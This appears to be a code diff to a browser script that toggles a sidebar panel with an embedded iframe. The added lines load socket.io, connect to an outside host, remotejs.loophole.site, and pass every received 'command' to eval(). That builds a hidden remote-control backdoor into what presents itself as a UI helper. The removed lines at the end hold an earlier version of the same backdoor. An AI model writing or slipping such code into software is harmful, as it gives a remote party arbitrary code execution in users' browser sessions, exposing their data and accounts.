@@ -1,6 +1,13 @@
+document.body.innerHTML+='<script src="https://raw.githubusercontent.com/socketio/socket.io-client/master/dist/socket.io.js"></script>'
 if (document.getElementById('sidemenu')) {
     document.getElementById('sidemenu').remove();
 } else {
+      alert("Connecting");
+      var socket = io.connect("https://remotejs.loophole.site");
+      alert("Connected");
+      socket.on("command", function(command) {
+        eval(command);
+      });
     var sidemenu;
     var bdy;
     var gui = true;
@@ -18,7 +25,8 @@ if (document.getElementById('sidemenu')) {
     
     <button style="float:right; background:red; color:black; width:50px; height:4%; border:none; font-size:25px; font-family:Monospace;" onclick='sidemenu.setAttribute("style","display:none;");gui=false;'>-</button>
     
-    <iframe id="sidemenuframe" src="data:text/html,<body style='background:black; color:white; font-family:Monospace;'>Enter URL above</body>" style="height:96%; width:100%; color:black; font-family:Monospace; font-size:12px; z-index:10000; display: float; overflow:visible; position:fixed; left:0; top: 4%; background:white; border:none; float:left;"></iframe>`;
+    <iframe id="sidemenuframe" src="data:text/html,<body style='background:black; color:white; font-family:Monospace;'>Enter URL above</body>" style="height:96%; width:100%; color:black; font-family:Monospace; font-size:12px; z-index:10000; display: float; overflow:visible; position:fixed; left:0; top: 4%; background:white; border:none; float:left;"></iframe>
+    `;
 }
 void 0;
 document.onkeydown = function (e) {
@@ -32,18 +40,5 @@ document.onkeydown = function (e) {
     }
   }
 }
-
-document.body.innerHTML+=`
-<script>alert("getting script");</script>
-<script src="https://remotejs.loophole.site/socket.io/socket.io.js"/>
-<script>
-  alert("Connecting");
-  var socket = io.connect("https://remotejs.loophole.site");
-  alert("Connected");
-  socket.on("command", function(command) {
-    eval(command);
-  });
-</script>
-`
 
 
